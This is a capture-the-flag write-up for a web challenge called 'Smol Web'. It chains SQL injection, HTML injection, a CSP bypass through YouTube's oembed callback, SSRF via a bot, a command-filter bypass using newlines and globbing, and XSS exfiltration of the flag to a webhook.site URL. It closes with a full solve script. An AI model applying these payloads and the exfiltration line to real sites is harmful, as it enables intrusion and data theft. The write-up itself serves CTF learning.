## <tl;dr>

Smol Web is a web challenge for 0xL4ugh CTF V5. 
To get the flag you have to find the following exploit chain:

SQLi --> Chained SQLi --> HTML Injection --> CSP Bypass --> XSS --> SSRF --> Regex bypass --> RCE --> window.location XSS Data exfil

As of writing this, this challenge was probably the most fun challenge I have ever solved. 10/10

## </tl;dr>

## Starting off

Starting off on Smol Web the first thing I did is run `grep -ri "flag"` on the source code root to find out that there is a `readflagbinary` binary that as the name implies reads the flag.

This tells me I need RCE, but I won't hit RCE for a while.

A general overview of the source code shows me the challenge consists of three main 'parts':
- It contains a bot that visits any endpoint within the domain
- Two endpoints that are locked to localhost only
- Three endpoints that are accessible to anyone

## SQLi 1

Looking at the source code, you can easily find the first vulnerability, SQLi:
```python
@rating_app.route("/ratings")
def ratings_challenge():
    
    quantity = request.args.get("quantity", "") or '9'
    if any(c in quantity for c in ("'", '"', "\\")):
       quantity = 7
       flash("Warning: Suspicious characters detected in the quantity parameter.")
    db = get_db()
    sql = f"SELECT id, name, description, user_id FROM products WHERE quantity = {quantity}"
```

In that select statement it inserts user input into the statement before executing it, now notice how there's no quotes around the variable, as the input is assumed to be a number.
This means there's no need to even escape the input, a space is all you need.

So, to get this SQLi I make the following request:
```
http://172.17.0.1:5000/ratings?quantity=1+OR+1=1
```

That's just an example, it'll be used a LOT more.

## SQLi 2 & HTML injection

The next step here is a little obvious when you look at the source code:
```python
products_with_ratings = []
    try:
        rows = db.execute(sql).fetchall()
    except sqlite3.Error as e:
        rating_app.logger.error(f"SQL Error: {e}")
        return make_response("[ERROR 500] Database Malfunction. Please report this bug." + str(e), 500)

    for r in rows:
        user_name = "(unknown user)"
        try:
            user_q = f"SELECT id, name FROM users WHERE id = {r['user_id']}"
            user_row = db.execute(user_q).fetchone()
            user_name = user_row['name'] if user_row else "(unknown user)"
        except Exception:
            user_name = "(Error)"
        avg_rating_q = f"SELECT AVG(rating) AS avg FROM ratings WHERE product_id = {r['id']}"
```

If you look in there, you'll see yet another SQLi in the `user_q` variable.
Now, why does this matter? Well, `user_name` is made from that query and `user_name` is used in this line of code:
```python
products_with_ratings.append({
            "name": r["name"],
            "description": r["description"],
            "creator": user_name,
            "rating": avg_rating
        })
    return render_template("ratings_page.html", products=products_with_ratings, title=f"")
```

Looking at `ratings_page.html` we see this VERY interesting chunk:
```html
        {% for product in products %}
        
            {{ product.name }}
            {{ product.description }}
            {{ product.creator|safe }}
            {{ product.rating }}
        
```

The `product.creator` variable, i.e `user_name` is trusted on the front end. That `|safe` makes it vulnerable to HTML injection.

To control product creator you first need to get past the quotes filter, as we cannot supply any strings.
To get past that we can simply use `CHAR()` in SQL to build our string, and that's the first part of my solve script:
```python
def string_to_char(s, chunk_size=100):
    chunks = []
    for i in range(0, len(s), chunk_size):
        chunk = s[i:i+chunk_size]
        char_codes = ','.join(str(ord(c)) for c in chunk)
        chunks.append(f"CHAR({char_codes})")
    
    if len(chunks) == 1:
        return chunks[0]
    else:
        return "CONCAT(" + ",".join(chunks) + ")"
```

That `CONCAT` line is also very important as I will later on discover there is a limit to how many variables `CHAR()` can take. As some background info `CHAR()` will take one or more numbers and return their corresponding character values.

The python code above simply builds a `CHAR()` function that returns the string fed into the function.

Now, to get control over the `user_name`, we need to first UNION in a fake entry into the original query, and then in that query, and that query must return valid SQL to exploit the "chained" SQLi.

I achieved this with the following code:
```python
def build_payload(xss):
    nested_s = f"'a' UNION SELECT 1,'{xss}'"
    sqli = f"1+UNION+SELECT+1,2,3,{string_to_char(nested_s)}"
    return sqli
```

So, that will return a SQLi that UNIONs a SQLi into it. Sorry if I'm explaining this badly.
Here's an example query with some explanation though (not url encoded):
```
1 UNION SELECT 1,2,3 CHAR( [chars] )
```

Output of `CHAR( [chars] )`: `'a' UNION SELECT 1,'<script> alert(1); </script>'` (note, that XSS won't work)

Returns SQL entry with values `1,2,3,[SQLi string]`

Data will be processed, name will be taken as SQLi string and passed along to be rendered on the frontend.

## CSP Bypass & XSS

After doing all of that, I came to realize I was in fact NOT seeing my glorious `alert(1)` popup on the frontend :(

Taking a look at the CSP I saw the issue I was expecting:
```python
    csp = (
        "default-src 'self'; "
        "script-src 'self' https://cdn.tailwindcss.com https://www.youtube.com; "
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.tailwindcss.com; "
        "font-src 'self' https://fonts.gstatic.com; "
        "img-src 'self' data:; "
        "child-src 'self' https://www.youtube.com; "
        "frame-src 'self' https://www.youtube.com; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "form-action 'self';"
    )
```

Hmm, looks pretty locked down huh?

One thing that did stick out to me is youtube being allowed, the rest of the domains made sense and were likely actually being used but youtube?

Taking a look online I stumbled across a beautiful website that I recommend everyone trying to bypass a CSP use: https://cspbypass.com/

This website finds known CSP bypasses, and well allowing youtube in your CSP is one of those known bypasses.

Youtube has a strange endpoint:
```
https://www.youtube.com/oembed?callback=[xss here]
```

This endpoint, when supplied with javascript will return valid executable javascript, which means if youtube is allowed in the CSP you can easily bypass it by using that endpoint as a source and supplying it with arbitrary javascript.

Now comes another segment of my solve script:
```python
def csp_bypass(xss):
    xss = quote(xss,safe='')
    yt_oembed = f""""""
    return yt_oembed
```

This one should be pretty self explanatory.

## SSRF

The challenge contains a `/report` endpoint that makes a bot visit an endpoint within the same domain, there is also two endpoints, `/search`, and `/finder` that are locked to localhost only. The `/search` endpoint is the only one with real exploitable functionality but it is a POST only.
With our SSRF, we can make post requests to the endpoint.

## Regex bypass

The `/search` endpoint runs system commands with user input, more specifically the following command:
```bash
find ./uploads {sanitized_payload}
```

In the `/search` endpoint we see there is a lot of filtering, there are four restrictions here, only one of which is the real issue:

1. Payload length must be < 18
2. None of the following chars: `<>mhnpdvq$srl+%kowatf123456789'^@"\`
3. None of the following commands: `cc gcc ex sleep`
4. The following are escaped: `([;&|$\(\)\[\]<>])`

Here only #2 is actually blocking me, bypassing this was quite fun.

The first piece to the puzzle here is that you can supply a newline character to run a new command on an entirely new line, perfect. Now I need RCE.
Originally I tried different encodings or using `find ./uploads -exec`, however none of those worked.
I then realized globbing might help here. The filtering doesn't remove `?` or `*` or `/`
This actually worked quite well, I could now call `/readflagbinary` with `/????????*`
The amount of question marks can vary here as `readflagbinary` is by far the longest thing in the root directory.

So the payload here is: `%0a/????????*`

We can read the flag now :)

## Data exfil

The final piece of the puzzle. The last issue is actually reading the flag, as the bot is the one delivering this payload and getting the output.
My first idea was to go back to the SQLi and insert the base64 encoded HTML output into the database, however I quickly found out that two queries in one was not allowed in sqlite3.

My second idea was to use `window.location` to send a GET request to an attacker controlled server (I just used webhook.site).

This actually worked, although there was a lot of errors with encodings and passing an XSS payload that complex through multiple layers of transport which ended up mangling anything other than the simplest, most raw and basic javascript possible. I ended up with the following XSS payload:
```javascript
fetch('/search',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'search=%0a/??????*'}).then(function(r){return r.text()}).then(function(h){window.location='https://webhook.site/[unique-webhooks-id-thing]/'+btoa(h)})
```

Notice it does not use `=>` as that was getting absolutely mangled and obliterated when it hit the youtube endpoint.

Anyways, after trial and error I finally got it to work, and the final solve script looks like this:
```python
import requests as r
from urllib.parse import quote

#URL='http://172.17.0.1:5000/'
URL='http://challenges4.ctf.sd:34532/'

def string_to_char(s, chunk_size=100):
    chunks = []
    for i in range(0, len(s), chunk_size):
        chunk = s[i:i+chunk_size]
        char_codes = ','.join(str(ord(c)) for c in chunk)
        chunks.append(f"CHAR({char_codes})")
    
    if len(chunks) == 1:
        return chunks[0]
    else:
        return "CONCAT(" + ",".join(chunks) + ")"

def build_payload(xss):
    nested_s = f"'a' UNION SELECT 1,'{xss}'"
    sqli = f"1+UNION+SELECT+1,2,3,{string_to_char(nested_s)}"
    return sqli

def test_payload(xss):
    sqli = f"{build_payload(xss)}"
    req = f"{URL}ratings?quantity={sqli}"
    print(req)
    resp = r.get(req)
    return resp

def csp_bypass(xss):
    xss = quote(xss,safe='')
    yt_oembed = f""""""
    return yt_oembed

def ssrf(xss):
    xss = csp_bypass(xss)
    sqli = build_payload(xss)
    print(sqli)
    data = {'url' : f"/ratings?quantity={sqli}"}
    print(data)
    resp = r.post(f"{URL}report", data=data)
    return resp

def main():
    print(ssrf("fetch('/search',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'search=%0a/??????*'}).then(function(r){return r.text()}).then(function(h){window.location='https://webhook.site/3479cec8-1a02-45a8-8337-9b170e9f950d/'+btoa(h)})"))


if __name__ == "__main__":
    main()
```

Hallowed Be Thy Code.
